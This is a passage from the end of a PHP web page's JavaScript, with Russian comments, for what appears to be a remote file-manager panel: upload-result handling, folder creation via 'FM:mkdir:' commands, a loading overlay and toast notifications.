            .then(response => response.json())
            .then(data => {
                hideLoading();
                if (data.status === 'success') {
                    showToast('success', data.message);
                    // Обновляем файловый менеджер после загрузки
                    setTimeout(refreshFileManager, 2000);
                } else {
                    showToast('error', data.message);
                }
            })
            .catch(error => {
                hideLoading();
                console.error('Error:', error);
                showToast('error', 'Ошибка загрузки файла');
            });
        }

        function createNewFolder() {
            const folderName = prompt('Введите имя новой папки:');
            if (folderName) {
                // Исправление: правильно формируем путь для новой папки
                const newPath = currentPath.endsWith('\\') ? currentPath + folderName : currentPath + '\\' + folderName;
                sendCommand('FM:mkdir:' + newPath, function(response) {
                    if (response.status === 'success') {
                        showToast('success', 'Папка создана');
                        // Обновляем файловый менеджер после создания папки
                        setTimeout(refreshFileManager, 1000);
                    } else {
                        showToast('error', 'Ошибка создания папки: ' + response.message);
                    }
                });
            }
        }

        function showLoading() {
            document.getElementById('loading-overlay').style.display = 'flex';
        }

        function hideLoading() {
            document.getElementById('loading-overlay').style.display = 'none';
        }

        function showToast(type, message) {
            const icons = {
    success: '<i class="fas fa-check-circle text-success"></i>',
    error: '<i class="fas fa-times-circle text-danger"></i>',
    info: '<i class="fas fa-info-circle text-info"></i>'
};
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `
                <i>${icons[type]}</i>
                <span>${message}</span>
            `;

            const container = document.getElementById('toast-container');
            container.appendChild(toast);

            // Автоматическое удаление через 3 секунды
            setTimeout(() => toast.remove(), 3000);
        }

        // Обработчик для показа тостов из PHP
        <?php if (isset($_SESSION['toast'])): ?>
            window.onload = function() {
                showToast(
                    '<?= $_SESSION['toast']['type'] ?>',
                    '<?= addslashes($_SESSION['toast']['message']) ?>'
                );
            };
            <?php unset($_SESSION['toast']); ?>
        <?php endif; ?>
    </script>
</body>
</html>